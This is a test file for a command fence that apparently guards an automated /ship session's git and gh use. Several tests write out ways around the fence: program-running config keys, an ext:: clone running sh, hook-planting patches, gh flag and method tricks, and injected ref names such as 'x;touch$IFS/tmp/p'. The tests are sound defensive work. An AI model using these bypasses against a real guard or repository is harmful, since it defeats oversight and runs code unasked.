		for (const [name, flags] of [["single-branch", ["--single-branch"]], ["shallow", ["--depth", "1"]]] as const) {
			test(`${name}: the push names the fetch of the default branch, and goes after it`, () => {
				const { dir } = partialClone(...flags);
				armFence({ pushBranch: BRANCH, root: dir, pr: PR });
				write(path.join(dir, "src/a.ts"), "export const a = 2;\n");
				sh(dir, "commit", "--quiet", "-am", "mine");
				const blocked = gitAt(dir, process.env, "push", "origin", BRANCH);
				expect(blocked.status).toBe(1);
				expect(blocked.stderr).toContain("run git fetch origin main;");
				expect(blocked.stderr).not.toContain("This is final");
				// A plain fetch leaves it missing, which is why the refusal names the ref.
				expect(gitAt(dir, process.env, "fetch", "--quiet", "origin").status).toBe(0);
				expect(gitAt(dir, process.env, "push", "origin", BRANCH).stderr).toContain("run git fetch origin main;");
				expect(gitAt(dir, process.env, ...namedFetch(blocked.stderr)).status).toBe(0);
				expect(gitAt(dir, process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);
				expect(originHas(BRANCH)).toBe(sh(dir, "rev-parse", "HEAD").trim());
			});
		}

		test("when the branch tip and the default branch are both missing, one fetch names both", () => {
			const { dir, other } = partialClone("--single-branch");
			sh(other, "fetch", "--quiet", "origin", BRANCH);
			sh(other, "reset", "--quiet", "--hard", `origin/${BRANCH}`);
			write(path.join(other, "src/c.ts"), "export const c = 1;\n");
			sh(other, "add", "-A");
			sh(other, "commit", "--quiet", "-m", "teammate");
			sh(other, "push", "--quiet", "origin", BRANCH);
			armFence({ pushBranch: BRANCH, root: dir, pr: PR });
			write(path.join(dir, "src/a.ts"), "export const a = 2;\n");
			sh(dir, "commit", "--quiet", "-am", "mine");
			const blocked = gitAt(dir, process.env, "push", "origin", BRANCH);
			expect(blocked.stderr).toContain(`run git fetch origin ${BRANCH} main;`);
			expect(gitAt(dir, process.env, ...namedFetch(blocked.stderr)).status).toBe(0);
			expect(gitAt(dir, process.env, "merge", "--quiet", "--no-edit", `origin/${BRANCH}`).status).toBe(0);
			expect(gitAt(dir, process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);
		});
	});

	test("a protected change the branch held when /ship armed, or origin's branch already holds, is not the push's", () => {
		write(path.join(repo, ".github/workflows/ci.yml"), "name: CI\non: [pull_request]\n");
		sh(repo, "commit", "--quiet", "-am", "the user's own edit");
		armFence({ pushBranch: BRANCH, root: repo, pr: PR });
		write(path.join(repo, "src/a.ts"), "export const a = 2;\n");
		sh(repo, "commit", "--quiet", "-am", "session fix");
		expect(git(process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);

		const other = teammate();
		sh(other, "fetch", "--quiet", "origin", BRANCH);
		sh(other, "reset", "--quiet", "--hard", `origin/${BRANCH}`);
		write(path.join(other, ".github/workflows/ci.yml"), "name: CI\non: [push]\n");
		sh(other, "commit", "--quiet", "-am", "teammate edits the workflow");
		sh(other, "push", "--quiet", "origin", BRANCH);
		expect(git(process.env, "fetch", "--quiet", "origin").status).toBe(0);
		expect(git(process.env, "merge", "--quiet", "--no-edit", `origin/${BRANCH}`).status).toBe(0);
		write(path.join(repo, "src/a.ts"), "export const a = 3;\n");
		sh(repo, "commit", "--quiet", "-am", "session fix 2");
		expect(git(process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);
	});

	test("a push is refused, not waved through, when origin can't be read", () => {
		armFence({ pushBranch: BRANCH, root: repo, pr: PR });
		const down: Git = (dir, ...args) => (args[0] === "ls-remote" ? { code: 128, out: "" } : realGit(dir, ...args));
		expect(checkPushContent(repo, [BRANCH], currentState(), down)).toContain("origin");
		expect(checkPushContent(repo, [BRANCH], { ...currentState(), pushBranch: null })).toContain("pushes nothing");
	});

	test("what a push would send is read off git's dry-run listing: the branch alone goes, a tag or another ref does not, and a listing that can't be read is no yes", () => {
		armFence({ pushBranch: BRANCH, root: repo, pr: PR });
		const state = currentState();
		const listing = ["push", "--dry-run", "--porcelain", "--no-verify", "origin", BRANCH];
		const says = (out: string, code = 0, err = ""): Git => () => ({ code, out, err });
		const sent = (...lines: string[]) => `To /x/remote.git\n${lines.join("\n")}\nDone\n`;
		const own = `refs/heads/${BRANCH}:refs/heads/${BRANCH}`;
		for (const line of [`*\t${own}\t[new branch]`, ` \t${own}\t07f99e7..8401aad`, `+\t${own}\t07f99e7...8401aad (forced update)`, `=\t${own}\t[up to date]`, `!\t${own}\t[rejected] (non-fast-forward)`]) {
			expect(checkPushRefs(repo, listing, state, says(sent(line), line.startsWith("!") ? 1 : 0)), line).toBeNull();
		}
		const tags = checkPushRefs(repo, listing, state, says(sent(`*\t${own}\t[new branch]`, "*\trefs/tags/v1:refs/tags/v1\t[new tag]", "*\trefs/tags/v2:refs/tags/v2\t[new tag]")));
		expect(tags).toContain("refs/tags/v1, refs/tags/v2");
		expect(tags).toContain(`git push --no-follow-tags origin ${BRANCH}`);
		expect(tags).not.toContain("This is final");
		// With --no-follow-tags already on the line, a tag is no config's doing: that is final.
		const stillTagged = checkPushRefs(repo, [...listing.slice(0, 4), "--no-follow-tags", ...listing.slice(4)], state, says(sent(`*\t${own}\t[new branch]`, "*\trefs/tags/v1:refs/tags/v1\t[new tag]")));
		expect(stillTagged).toContain("refs/tags/v1");
		expect(stillTagged).toContain("This is final");
		const other = checkPushRefs(repo, listing, state, says(sent(`*\t${own}\t[new branch]`, "*\trefs/heads/other:refs/heads/other\t[new branch]", "*\trefs/tags/v1:refs/tags/v1\t[new tag]")));
		expect(other).toContain("refs/heads/other, refs/tags/v1");
		expect(other).toContain("This is final");
		expect(checkPushRefs(repo, listing, state, says(sent("-\t:refs/heads/other\t[deleted]")))).toContain("refs/heads/other");
		for (const out of ["", "Done\n", "To /x/remote.git\nDone\n", "fatal: nope\n"]) {
			const none = checkPushRefs(repo, listing, state, says(out, 128, "fatal: unable to access 'x'\n"));
			expect(none, JSON.stringify(out)).toContain("can't tell what the push would send");
			expect(none).toContain("unable to access");
			expect(none).not.toContain("This is final");
		}
		expect(checkPushRefs(repo, listing, state, says("", 1))).toContain("exit 1");
		expect(checkPushRefs(repo, listing, { ...state, pushBranch: null }, says(sent(`*\t${own}\t[new branch]`)))).toContain("pushes nothing");
	});

	test("the fetch a refusal names comes from origin's own listing: its default branch by name, HEAD when none is named, a shell-safe word either way", () => {
		armFence({ pushBranch: BRANCH, root: repo, pr: PR });
		const oid = "1".repeat(40);
		const origin = (listing: string): Git => (dir, ...args) => (args[0] === "ls-remote" ? { code: 0, out: listing } : args[0] === "cat-file" ? { code: 1, out: "" } : realGit(dir, ...args));
		const refuse = (listing: string) => checkPushContent(repo, [BRANCH], currentState(), origin(listing));
		expect(refuse(`ref: refs/heads/trunk\tHEAD\n${oid}\tHEAD\n`)).toContain("run git fetch origin trunk;");
		expect(refuse(`ref: refs/heads/trunk\tHEAD\n${oid}\tHEAD\n${"2".repeat(40)}\trefs/heads/${BRANCH}\n`)).toContain(`run git fetch origin ${BRANCH} trunk;`);
		expect(refuse(`${oid}\tHEAD\n`)).toContain("run git fetch origin HEAD;");
		expect(refuse(`ref: refs/heads/x;touch$IFS/tmp/p\tHEAD\n${oid}\tHEAD\n`)).toContain("run git fetch origin 'x;touch$IFS/tmp/p';");
		// A name that opens with `-` would be an option to fetch: it goes in full.
		expect(refuse(`ref: refs/heads/-x\tHEAD\n${oid}\tHEAD\n`)).toContain("run git fetch origin refs/heads/-x;");
		expect(refuse(`ref: refs/heads/--upload-pack=sh\tHEAD\n${oid}\tHEAD\n`)).toContain("run git fetch origin 'refs/heads/--upload-pack=sh';");
		expect(refuse(`ref: refs/heads/trunk\tHEAD\n${oid}\tHEAD\n`)).not.toContain("This is final");
	});

	test("a call whose environment lost the state name is refused", () => {
		armFence({ pushBranch: BRANCH, root: repo, pr: PR });
		const env = { ...process.env };
		delete env[FENCE_ENV];
		const r = git(env, "status");
		expect(r.status).toBe(1);
		expect(r.stderr).toContain(`${FENCE_ENV} was removed`);
	});

	describe("config, helper programs, patches and hooks that would step around the fence", () => {
		/** A stand-in program: appends its name and argv to ran.log, then runs `after`. A line in the log is proof that git ran it. */
		const RAN_LOG = path.join(privateHome(), "ran.log");
		const stand = (file: string, after = ""): string => {
			write(file, `#!/bin/sh\necho "${path.basename(file)} $*" >> ${RAN_LOG}\n${after}\nexit 0\n`);
			fs.chmodSync(file, 0o755);
			return file;
		};
		const ran = (): string[] => (fs.existsSync(RAN_LOG) ? fs.readFileSync(RAN_LOG, "utf8").trim().split("\n") : []);
		/** Runs git and collects what the fence let through, so a failing run lists every hole at once. */
		const holes: string[] = [];
		const refuse = (env: NodeJS.ProcessEnv, cwd: string, ...args: string[]): void => {
			const r = gitAt(cwd, env, ...args);
			if (r.status !== 1 || !r.stderr.includes("ship fence")) holes.push(`git ${args.join(" ")} => ${r.status}: ${r.stderr.trim().split("\n")[0]}`);
		};
		beforeEach(() => {
			holes.length = 0;
		});

		test("config that runs a program or reads more config is refused however it is set, and nothing runs", () => {
			armFence({ pushBranch: BRANCH, root: repo, pr: PR });
			const home = privateHome();
			const prog = stand(path.join(home, "bin", "prog"));
			const include = path.join(home, "inc.cfg");
			write(include, `[core]\n\tfsmonitor = ${prog}\n`);
			const exec = path.join(home, "xp");
			stand(path.join(exec, "git-upload-pack"));
			const viaEnv = { ...process.env, PROG: prog };
			refuse(process.env, repo, "-c", `core.fsmonitor=${prog}`, "status");
			refuse(viaEnv, repo, "--config-env=core.fsmonitor=PROG", "status");
			refuse(viaEnv, repo, "--config-env", "core.fsmonitor=PROG", "status");
			refuse(process.env, repo, "-c", `core.editor=${prog}`, "commit", "--allow-empty");
			refuse(process.env, repo, "-c", `gpg.program=${prog}`, "-c", "user.signingkey=k", "commit", "--allow-empty", "-S", "-m", "x");
			refuse(process.env, repo, "-c", `include.path=${include}`, "config", "--get", "core.fsmonitor");
			refuse(process.env, repo, "-c", "protocol.ext.allow=always", "clone", `ext::sh -c touch% ${home}/ext-ran`, path.join(home, "cloned"));
			refuse(process.env, repo, "-c", `credential.helper=${prog}`, "fetch", "origin");
			refuse(process.env, repo, "config", "core.fsmonitor", prog);
			refuse(process.env, repo, "config", "--typ", "path", "core.fsmonitor", prog);
			refuse(process.env, repo, "config", "--add", "include.path", include);
			refuse(process.env, repo, "config", "--global", "core.pager", prog);
			refuse(process.env, repo, "config", "diff.x.textconv", prog);
			refuse(process.env, repo, "config", "filter.x.clean", prog);
			refuse(process.env, repo, "config", "gpg.program", prog);
			refuse({ ...process.env, GIT_EDITOR: prog }, repo, "config", "--edit");
			// A harmless key's section renamed over a risky one would carry its keys along.
			expect(gitAt(repo, process.env, "config", "foo.fsmonitor", prog).status).toBe(0);
			refuse(process.env, repo, "config", "--rename-section", "foo", "core");
			refuse(process.env, repo, `--exec-path=${exec}`, "fetch", "origin");
			refuse({ ...process.env, GIT_CONFIG_COUNT: "1", GIT_CONFIG_KEY_0: "core.fsmonitor", GIT_CONFIG_VALUE_0: prog }, repo, "status");
			refuse({ ...process.env, GIT_CONFIG_PARAMETERS: `'core.fsmonitor'='${prog}'` }, repo, "status");
			expect(holes).toEqual([]);
			expect(ran()).toEqual([]);
			expect(fs.existsSync(path.join(home, "ext-ran"))).toBe(false);
			// The repo's own config and the private home's: a runner's /etc/gitconfig may hold filter.lfs.* of its own.
			for (const scope of ["--local", "--global"]) {
				const kept = spawnSync("git", ["config", scope, "--get-regexp", "^(include|core\\.(fsmonitor|pager|editor)|diff|filter|gpg)\\."], { cwd: repo, env: { ...process.env, PATH: savedPath }, encoding: "utf8" });
				expect(kept.stdout.trim(), scope).toBe("");
				expect(kept.status, scope).toBe(1);
			}
		}, 30_000);

		test("commands that only look like those still run: reads of the keys, harmless config, asking for the exec path", () => {
			armFence({ pushBranch: BRANCH, root: repo, pr: PR });
			for (const args of [
				["config", "--get", "core.fsmonitor"], ["config", "core.hooksPath"], ["config", "--get-regexp", "^remote\\."], ["config", "--list"], ["config", "user.name", "tester"], ["config", "pull.rebase", "false"],
				["-c", "core.quotepath=false", "status", "--short"], ["-c", "user.name=x", "-c", "user.email=x@y", "commit", "--allow-empty", "-m", "x"], ["-c", "color.ui=never", "log", "-1", "--oneline"], ["--exec-path"],
			]) {
				const r = gitAt(repo, process.env, ...args);
				expect(r.stderr, args.join(" ")).not.toContain("ship fence");
				expect(r.status ?? 0, args.join(" ")).toBeLessThan(2);
			}
			expect(fs.readFileSync(path.join(repo, ".git", "config"), "utf8")).toContain("name = tester");
		});

		const hookPatch = (p: string) => [`diff --git a/${p} b/${p}`, "new file mode 100755", "index 0000000..e69de29", "--- /dev/null", `+++ b/${p}`, "@@ -0,0 +1,2 @@", "+#!/bin/sh", "+echo planted", ""].join("\n");

		test("apply plants no hook: --unsafe-paths and a patch that names a path in a git folder are refused", () => {
			armFence({ pushBranch: BRANCH, root: repo, pr: PR });
			const patch = path.join(privateHome(), "hook.patch");
			write(patch, hookPatch(".git/hooks/pre-commit"));
			for (const args of [["apply", "--unsafe-paths", patch], ["apply", "--uns", patch], ["apply", "-p0", "--unsafe-paths", patch], ["apply", patch], ["apply", "--check", patch]]) refuse(process.env, repo, ...args);
			// A git folder that isn't named .git is not caught by git's own check.
			const proj = path.join(privateHome(), "projects", "sep");
			fs.mkdirSync(proj, { recursive: true });
			sh(proj, "init", "--quiet", "-b", "main", "--separate-git-dir", path.join(proj, "gd"), ".");
			write(path.join(proj, "src/a.ts"), "export const a = 1;\n");
			sh(proj, "add", "src");
			sh(proj, "commit", "--quiet", "-m", "init");
			armFence({ pushBranch: BRANCH, root: proj, pr: PR });
			write(patch, hookPatch("gd/hooks/pre-commit"));
			refuse(process.env, proj, "apply", patch);
			expect(holes).toEqual([]);
			expect(fs.readdirSync(path.join(repo, ".git", "hooks")).filter(name => !name.endsWith(".sample"))).toEqual([]);
			expect(fs.readdirSync(path.join(proj, "gd", "hooks")).filter(name => !name.endsWith(".sample"))).toEqual([]);
			// An ordinary patch applies, however it was made.
			write(path.join(proj, "src/a.ts"), "export const a = 2;\n");
			const diff = sh(proj, "diff");
			sh(proj, "checkout", "--quiet", "--", "src/a.ts");
			write(patch, diff);
			expect(gitAt(proj, process.env, "apply", patch).status).toBe(0);
			expect(fs.readFileSync(path.join(proj, "src/a.ts"), "utf8")).toBe("export const a = 2;\n");
		});

		test("lfs commands that write the hooks never reach git-lfs, as `git lfs` or as `git-lfs`; the others do", () => {
			armFence({ pushBranch: BRANCH, root: repo, pr: PR });
			const stubs = path.join(privateHome(), "stubs");
			stand(path.join(stubs, "git-lfs"));
			process.env.PATH = [SHIM_DIR, stubs, ...(process.env.PATH ?? "").split(path.delimiter).filter(entry => entry !== SHIM_DIR)].join(path.delimiter);
			const lfs = (...args: string[]) => spawnSync("git-lfs", args, { cwd: repo, env: process.env, encoding: "utf8" });
			for (const args of [["lfs", "install", "--force"], ["lfs", "install"], ["lfs", "update", "--force"], ["lfs", "uninstall"]]) refuse(process.env, repo, ...args);
			for (const args of [["install", "--force"], ["install", "--local"], ["update", "--force"], ["uninstall"]]) {
				const r = lfs(...args);
				if (r.status !== 1 || !r.stderr.includes("ship fence")) holes.push(`git-lfs ${args.join(" ")} => ${r.status}: ${r.stderr.trim()}`);
			}
			expect(holes).toEqual([]);
			expect(ran()).toEqual([]);
			expect(git(process.env, "lfs", "ls-files").status).toBe(0);
			expect(lfs("env").status).toBe(0);
			expect(ran()).toEqual(["git-lfs ls-files", "git-lfs env"]);
		});

		test("a push that only changes the mode of a protected file is refused; a mode the base brought, or the branch held, is not", () => {
			const script = path.join(repo, ".githooks", "pre-commit");
			write(script, "#!/bin/sh\nexit 0\n");
			write(path.join(repo, ".husky", "pre-push"), "#!/bin/sh\nexit 0\n");
			sh(repo, "add", "-A");
			sh(repo, "commit", "--quiet", "-m", "tracked hook scripts, not executable");
			armFence({ pushBranch: BRANCH, root: repo, pr: PR });
			expect(Object.keys(currentState().snapshot).sort()).toEqual([".githooks/pre-commit", ".github/workflows/ci.yml", ".husky/pre-push"]);
			fs.chmodSync(script, 0o755);
			sh(repo, "commit", "--quiet", "-am", "make the hook executable");
			expect(sh(repo, "diff", "--summary", "HEAD~1", "HEAD")).toContain("mode change 100644 => 100755 .githooks/pre-commit");
			const push = git(process.env, "push", "origin", BRANCH);
			expect(push.status).toBe(1);
			expect(push.stderr).toContain("would change .githooks/pre-commit");
			expect(originHas(BRANCH)).toBe("");
			// Changing it back leaves nothing to push.
			sh(repo, "reset", "--quiet", "--hard", "HEAD~1");
			expect(git(process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);

			// What the base brings is fine: origin's default branch holds the hook executable.
			sh(repo, "switch", "--quiet", "main");
			sh(repo, "merge", "--quiet", "--ff-only", BRANCH);
			fs.chmodSync(path.join(repo, ".husky", "pre-push"), 0o755);
			sh(repo, "commit", "--quiet", "-am", "base makes pre-push executable");
			sh(repo, "push", "--quiet", "origin", "main");
			sh(repo, "switch", "--quiet", BRANCH);
			expect(git(process.env, "merge", "--quiet", "--no-edit", "origin/main").status).toBe(0);
			expect(git(process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);
		});

		test("a mode the branch held when /ship armed is not the push's change", () => {
			const script = path.join(repo, ".githooks", "pre-commit");
			write(script, "#!/bin/sh\nexit 0\n");
			sh(repo, "add", "-A");
			sh(repo, "commit", "--quiet", "-m", "hook");
			fs.chmodSync(script, 0o755);
			sh(repo, "commit", "--quiet", "-am", "the user's own chmod");
			armFence({ pushBranch: BRANCH, root: repo, pr: PR });
			write(path.join(repo, "src/a.ts"), "export const a = 2;\n");
			sh(repo, "commit", "--quiet", "-am", "session fix");
			expect(git(process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);
		});

		/** The git commands the skill's Conflicts section names, `<base>` filled in. */
		const conflictSteps = (base: string): string[][] => {
			const skill = fs.readFileSync(path.join(import.meta.dir, "..", "..", "skills", "ship", "SKILL.md"), "utf8");
			const section = /^## Conflicts\n([\s\S]*?)(?=^## )/m.exec(skill)?.[1] ?? "";
			return [...section.matchAll(/`git ([^`]+)`/g)].map(m => (m[1] as string).replace(/<base>/g, base).split(" "));
		};

		test("the skill's conflict steps bring and merge the base in a clone that holds only the watched branch", () => {
			// The branch is pushed, origin's main moves on, and the clone takes the branch alone: no origin/main there.
			write(path.join(repo, "src/b.ts"), "export const b = 1;\n");
			sh(repo, "add", "-A");
			sh(repo, "commit", "--quiet", "-m", "branch work");
			sh(repo, "push", "--quiet", "origin", BRANCH);
			const other = teammate();
			write(path.join(other, "README.md"), "base moved\n");
			sh(other, "add", "-A");
			sh(other, "commit", "--quiet", "-m", "base moves");
			sh(other, "push", "--quiet", "origin", "HEAD:refs/heads/main");
			const dir = path.join(privateHome(), "projects", "single");
			sh(privateHome(), "clone", "--quiet", "--no-local", "--single-branch", "--branch", BRANCH, bare(), dir);
			armFence({ pushBranch: BRANCH, root: dir, pr: PR });
			write(path.join(dir, "src/a.ts"), "export const a = 2;\n");
			sh(dir, "commit", "--quiet", "-am", "mine");
			// A plain fetch leaves the base out, so there is nothing named origin/main to merge.
			expect(gitAt(dir, process.env, "fetch", "--quiet", "origin").status).toBe(0);
			expect(gitAt(dir, process.env, "merge", "--no-edit", "origin/main").status).not.toBe(0);

			expect(conflictSteps("main")).toEqual([["fetch", "origin", "main"], ["merge", "FETCH_HEAD"]]);
			for (const step of conflictSteps("main")) {
				const r = gitAt(dir, process.env, ...step);
				expect(r.stderr, step.join(" ")).not.toContain("ship fence");
				expect(r.status, `${step.join(" ")}: ${r.stderr}`).toBe(0);
			}
			expect(sh(dir, "log", "--format=%s", "-1", "HEAD^2").trim()).toBe("base moves");
			expect(gitAt(dir, process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);
			expect(originHas(BRANCH)).toBe(sh(dir, "rev-parse", "HEAD").trim());
		});

		test("stock review and pass commands run while armed: log, show, diff, grep, blame, status, refs, local changes, gh reads", () => {
			const home = privateHome();
			write(path.join(repo, "src/b.ts"), "export const b = 1;\nexport const c = 2;\n");
			write(path.join(repo, "docs/notes.md"), "hooks live in .git/hooks\n");
			sh(repo, "add", "-A");
			sh(repo, "commit", "--quiet", "-m", "feat: b");
			sh(repo, "tag", "v1");
			write(path.join(repo, "src/a.ts"), "export const a = 2;\n");
			sh(repo, "commit", "--quiet", "-am", "fix: a");
			sh(repo, "branch", "side", "HEAD~1");
			write(path.join(repo, "src/c.ts"), "export const z = 1;\n");
			write(path.join(repo, "src/a.ts"), "export const a = 3;\n");
			armFence({ pushBranch: BRANCH, root: repo, pr: PR7 });
			const reads = [
				"log", "log --oneline", "log --oneline -n 3", "log --graph --oneline --all", "log -p -1", "log --stat", "log --name-only --format=", "log --name-status", "log -S export --oneline", "log -G const --oneline",
				"log --author=t --oneline", "log --since=2000-01-01 --oneline", "log --follow -- src/a.ts", "log main..HEAD --oneline", "log origin/main..HEAD --oneline", "log --merges --oneline", "log --all --decorate --oneline",
				"log --pretty=fuller -1", "log -1 --format=%B", "log --grep=fix --oneline", "log --first-parent --oneline", "log HEAD~1..HEAD", "log --diff-filter=A --name-only --format=", "log --oneline -- src",
				"show", "show HEAD", "show --stat HEAD", "show HEAD:src/a.ts", "show --name-status HEAD", "show HEAD~1:src/b.ts", "show v1", "show --format=%H -s HEAD",
				"diff", "diff --stat", "diff --name-only", "diff --cached", "diff main...HEAD", "diff main..HEAD --stat", "diff HEAD~1", "diff -w", "diff --shortstat", "diff -U0", "diff --color-words", "diff --numstat HEAD~1 HEAD",
				"diff --name-status main HEAD", "diff HEAD -- src/a.ts", "diff --staged", "diff --no-index src/a.ts src/a.ts",
				"grep -n export", "grep -i EXPORT", "grep -e export -e const", "grep --count export", "grep -l export", "grep -n export HEAD~1", "grep -E export.(const|let)", "grep -n .git/hooks docs/notes.md", "grep -w a -- src", "grep --heading -n export",
				"blame src/a.ts", "blame -L1,2 src/b.ts", "blame --porcelain src/a.ts", "blame -w src/a.ts", "blame HEAD~1 -- src/a.ts",
				"status", "status -s", "status --porcelain", "status -b", "status --short --branch", "status --ignored", "status -uall", "status --porcelain=v2 --branch",
				"rev-parse HEAD", "rev-parse --abbrev-ref HEAD", "rev-parse --show-toplevel", "rev-parse --git-dir", "rev-parse --verify HEAD~1", "ls-files", "ls-files --others --exclude-standard", "ls-tree -r HEAD", "ls-tree --name-only HEAD",
				"cat-file -p HEAD", "cat-file -t HEAD", "cat-file -s HEAD:src/a.ts", "for-each-ref", "for-each-ref --format=%(refname) refs/heads", "branch -a", "branch -vv", "branch --show-current", "branch --contains HEAD", "branch --list",
				"tag -l", "tag --points-at HEAD", "describe --always --tags", "shortlog -sn HEAD", "rev-list --count HEAD", "rev-list HEAD~1..HEAD", "merge-base main HEAD", "name-rev HEAD", "show-ref", "show-ref --heads",
				"config --get remote.origin.url", "config --list", "config -l --show-origin", "config user.name", "remote -v", "remote show origin", "remote get-url origin", "stash list", "reflog -5", "worktree list", "count-objects -v",
				"fsck --no-dangling", "ls-remote origin", "ls-remote --heads origin", "fetch origin", "fetch --prune origin", "fetch origin main", "diff-tree --no-commit-id --name-only -r HEAD", "diff-index HEAD", "cherry -v main",
				"format-patch -1 --stdout", "show-branch", "var GIT_AUTHOR_IDENT", "--version", "-C src status -s", "--no-pager log -1", "-c core.quotepath=false log -1 --name-only", "-c color.ui=never diff --stat", "-c user.name=x -c user.email=x@y log -1",
			].map(line => line.split(" "));
			const local = [
				["archive", "--format=tar", "HEAD", "-o", path.join(home, "a.tar")], ["archive", "HEAD", "--prefix=x/", "-o", path.join(home, "b.zip")],
				["add", "src/c.ts"], ["commit", "-m", "chore: add c"], ["commit", "--allow-empty", "-m", "chore: empty"], ["stash", "push", "-m", "wip"], ["stash", "list"], ["stash", "pop"], ["switch", "-c", "tmp"], ["switch", BRANCH], ["branch", "-d", "tmp"],
				["merge", "--no-edit", "side"], ["tag", "v2"], ["push", "--dry-run", "origin", BRANCH], ["push", "origin", BRANCH], ["pull", "--ff-only", "origin", BRANCH],
			];
			const gh = path.join(home, "stubs", "gh");
			write(gh, "#!/bin/sh\necho stub gh $*\n");
			fs.chmodSync(gh, 0o755);
			process.env.PATH = [SHIM_DIR, path.dirname(gh), ...(process.env.PATH ?? "").split(path.delimiter).filter(entry => entry !== SHIM_DIR)].join(path.delimiter);
			const marked = "<!-- omp-ship -->\nFixed the failing test.";
			const ghReads = [
				["pr", "view", "7"], ["pr", "view", "7", "--json", "state,statusCheckRollup"], ["pr", "checks", "7"], ["pr", "diff", "7"], ["pr", "list", "--state", "open"], ["pr", "status"], ["pr", "comment", "7", "-R", "o/r", "--body", marked], ["pr", "edit", "7", "-R", "o/r", "--body", "x"],
				["run", "view", "123", "--log-failed"], ["run", "list", "--limit", "5"], ["run", "rerun", "123", "-R", "o/r", "--failed"], ["api", "repos/o/r/pulls/7/comments"], ["api", "repos/o/r/issues/7/comments", "-f", `body=${marked}`],
				["api", "graphql", "-f", "query=query{viewer{login}}"], ["issue", "view", "3"], ["issue", "list"], ["repo", "view"], ["auth", "status"], ["-R", "o/r", "pr", "view", "7"],
			];
			expect(reads.length + local.length + ghReads.length).toBeGreaterThanOrEqual(85);
			const failed: string[] = [];
			for (const args of [...reads, ...local]) {
				const r = git(process.env, ...args);
				if (r.status !== 0 || r.stderr.includes("ship fence")) failed.push(`git ${args.join(" ")} => ${r.status}: ${r.stderr.trim().split("\n")[0]}`);
			}
			for (const args of ghReads) {
				const r = spawnSync("gh", args, { cwd: repo, env: process.env, encoding: "utf8" });
				if (r.status !== 0 || !r.stdout.startsWith("stub gh")) failed.push(`gh ${args.join(" ")} => ${r.status ?? r.signal ?? r.error?.message}: ${r.stderr.trim().split("\n")[0]}`);
			}
			expect(failed).toEqual([]);
			expect(originHas(BRANCH)).toBe(sh(repo, "rev-parse", "HEAD").trim());
		}, 30_000);

		/** gh after the shims on PATH, standing in for the real one: a line in ran.log is proof that gh itself ran. */
		const stubGh = (after = ""): void => {
			const stubs = path.join(privateHome(), "stubs");
			stand(path.join(stubs, "gh"), after);
			process.env.PATH = [SHIM_DIR, stubs, ...(process.env.PATH ?? "").split(path.delimiter).filter(entry => entry !== SHIM_DIR)].join(path.delimiter);
		};
		const runGh = (...args: string[]) => spawnSync("gh", args, { cwd: repo, env: process.env, encoding: "utf8" });
		const refuseGh = (...args: string[]): void => {
			const r = runGh(...args);
			if (r.status !== 1 || !r.stderr.includes("ship fence")) holes.push(`gh ${args.join(" ")} => ${r.status}: ${r.stderr.trim().split("\n")[0]}`);
		};
		const marker = "<!-- omp-ship -->";
		/** How many gh runs the stub logged: a body with a newline in it spreads over lines, so only the stub's own lines count. */
		const ghRuns = (): number => ran().filter(line => line.startsWith("gh ")).length;

		test("gh api sends the last of -X and --method, so a GET in front of a PUT is a PUT", () => {
			armFence({ pushBranch: BRANCH, root: repo, pr: PR });
			stubGh();
			const merge = "repos/o/r/pulls/5/merge";
			for (const args of [
				["api", "-X", "GET", "--method", "PUT", merge], ["api", "--method", "GET", "-X", "PUT", merge], ["api", "-X", "GET", "-X", "PUT", merge], ["api", "--method=GET", "--method=PUT", merge],
				["api", "-XGET", "-XPUT", merge], ["api", "-X=GET", "-X=PUT", merge], ["api", merge, "-X", "GET", "-X", "PUT"], ["api", "-X", "GET", "--method=DELETE", "repos/o/r/git/refs/heads/feat"],
			]) refuseGh(...args);
			expect(holes).toEqual([]);
			expect(ran()).toEqual([]);
			// The last method decides the other way too: a PUT in front of a GET reads.
			for (const args of [["api", "-X", "PUT", "-X", "GET", "repos/o/r/pulls/5"], ["api", "--method=PUT", "-XGET", "repos/o/r/pulls/5"], ["api", "-X=PUT", "--method", "GET", "repos/o/r/pulls/5"]]) {
				expect(runGh(...args).stderr, args.join(" ")).not.toContain("ship fence");
			}
			expect(ran()).toHaveLength(3);
		}, 30_000);

		test("a flag in front of gh's command words takes the word after it, so the command gh runs is not the one the fence would see", () => {
			armFence({ pushBranch: BRANCH, root: repo, pr: PR });
			stubGh();
			for (const args of [
				// `-t x` is merge's --subject, `-b x` is review's --body, `-c x` is close's --comment: cobra finds the subcommand past them.
				["pr", "-t", "x", "merge", "5"], ["pr", "--subject", "x", "merge", "5"], ["pr", "-b", "x", "review", "5", "--approve"], ["pr", "-c", "x", "close", "5"], ["pr", "-t", "x", "merge", "-R", "o/r", "5"],
				// `-p pr` is api's preview flag twice, which keeps `pr pr` where the command words would be.
				["-p", "pr", "-p", "pr", "api", "repos/o/r/pulls/5/merge", "-X", "PUT"], ["-p", "pr", "-p", "pr", "api", "-X", "POST", "repos/o/r/pulls/5/reviews", "-f", "event=APPROVE"],
				["--jq", "x", "pr", "merge", "5"], ["-q", "pr", "pr", "merge", "5"],
				// cobra skips an empty word and a lone `-` on its way to the command, and passes them on as its words.
				["pr", "-", "merge", "-R", "o/r"], ["pr", "", "merge"], ["pr", "--repo", "--", "-", "lock", "5"],
				// A base set behind a flag whose value could be taken for it: `-b -R` is a body, and `-B=main` the base.
				["pr", "edit", "7", "-b", "-R", "-B=main"], ["pr", "edit", "7", "--base", "main"], ["pr", "edit", "7", "-Bmain"],
			]) refuseGh(...args);
			expect(holes).toEqual([]);
			expect(ran()).toEqual([]);
			// The repo flags may stand anywhere gh reads them.
			for (const args of [["-R", "o/r", "pr", "view", "7"], ["pr", "-R", "o/r", "view", "7"], ["--repo=o/r", "pr", "view", "7"], ["-Ro/r", "pr", "view", "7"], ["pr", "view", "7", "-R", "o/r"], ["--hostname", "github.com", "api", "user"]]) {
				expect(runGh(...args).stderr, args.join(" ")).not.toContain("ship fence");
			}
			expect(ran()).toHaveLength(6);
		}, 30_000);

		test("gh pr create opens a draft only when the last --draft or -d is a true bool, as strconv.ParseBool reads it; a flag's value can't be the --draft that follows it", () => {
			armFence({ pushBranch: BRANCH, root: repo, pr: PR });
			stubGh();
